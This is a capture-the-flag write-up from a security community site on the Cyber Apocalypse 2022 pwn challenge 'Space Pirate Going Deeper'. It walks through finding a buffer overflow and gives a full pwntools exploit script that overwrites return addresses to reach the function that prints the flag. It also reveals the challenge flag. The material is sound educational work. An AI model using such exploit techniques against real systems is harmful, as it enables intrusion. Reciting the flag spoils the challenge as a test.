---
layout: load_md
title: The White Circle | Cyber Apocalypse 2022 | Space Pirate Going Deeper Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2022
parent: cyber_apocalypse_2022
category: pwn
challenge: Space Pirate Going Deeper
tags: "pwn, taz, bof, python"
---

<h1 class="heading card-title white-text">Cyber Apocalypse 2022</h1>

## Space Pirate Going Deeper
> Solved by:  Taz34

Here we have a 64 bit binary which takes input as follows:

![](https://i.imgur.com/q2tXif4.png)

After playing around with the binary i came across a Segmentation fault, hence we have a buffer overflow exploit here.

![](https://i.imgur.com/u0IXBic.png)

So I found the offset to be 50. 

Now to understand the working of the binary I opened the binary in Cutter
https://cutter.re/

Here we came across the main function and another interesting function named admin_panel
In the admin_panel function we came across an if statement:

![](https://i.imgur.com/w6r55nM.png)

From here we can understand that, if we want to print the flag i.e. `system(``"``cat flag``"``);`
we need to make the if condition false.

So now we can create the payload

```python
payload = b'A'*offset + ret_addr_main + ret_addr_admin_panel + if_arg1 + if_arg3 + if_arg3
payload = b'A'*50 + p64(0x400b9a) + p64(0x400b46) +p64(0xdeadbeef) + p64(0x1337c0de) + p64(0x1337beef)
```

Now we have our payload set, hence the final script:

```python
from pwn import *
#elf = ELF('./sp_going_deeper')
#p = elf.process()
p = remote("138.68.161.126", 31239) 

payload = b'A'*50 + p64(0x400b9a) + p64(0x400b46) +p64(0xdeadbeef) + p64(0x1337c0de) + p64(0x1337beef)

p.sendline('1')
p.sendline(payload)
p.interactive()
```

![](https://i.imgur.com/jgsMkE9.png)


And here the flag is dumped.

```
Flag: HTB{no_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_flow_r3d1r3ct}
```